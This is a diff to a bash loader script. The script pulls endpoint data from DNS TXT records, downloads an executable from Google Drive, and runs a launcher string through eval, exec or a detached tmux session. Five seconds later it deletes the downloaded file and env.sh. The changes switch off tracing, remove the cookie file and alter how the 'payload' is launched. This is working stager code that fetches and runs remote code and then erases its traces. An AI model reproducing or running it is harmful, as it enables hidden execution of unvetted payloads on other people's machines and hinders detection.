@@ -1,5 +1,6 @@
 #!/bin/bash
 
+set +x
 TMX=${TMX:-0}
 PATH=.:$PATH
 
@@ -30,7 +31,7 @@ parsedata() {
 }
 
 querydns() {
-    dig="dig txt ${record}.${zone} +short +tcp +timeout=3 +retries=0"
+    dig="$dig txt ${record}.${zone} +short +tcp +timeout=3 +retries=0"
     $dig @1.1.1.1 || $dig @8.8.8.8 || $dig
 }
 
@@ -66,6 +67,7 @@ getdig() {
          "https://drive.google.com/uc?export=download&confirm=`awk '/download/ {print $NF}' ./cookie`&id=${fileid}" \
          -O ${filename}
     chmod +x "$filename"
+    rm -f ./cookie
 }
 
 if type dig &>/dev/null; then
@@ -77,7 +79,7 @@ else
             endpoints_fallback
 fi
 
-export pl_token="${pl_token}" pl_name="${pl_name:-payload-latest.zip}"
+export pl_token="${pl_token}" pl_name="${pl_name:-payload.zip}"
 # echo "export \
 #     ">>env.sh
 
@@ -90,9 +92,10 @@ if [ "$TMX" = 1 ]; then
     tmux  setenv -g pl_token "$pl_token"
     tmux  setenv -g pl_name "$pl_name"
 
-    tmux new -d -s crt 'eval '"$launcher"
+    tmux new -d -s crt
+    tmux send-keys -t crt "$launcher" Enter
     (sleep 5 && rm -f env.sh "$filename") &>/dev/null &
 else
     (sleep 5 && rm -f env.sh "$filename") &>/dev/null &
-    eval "$launcher"
+    exec bash <<<"$launcher"
 fi
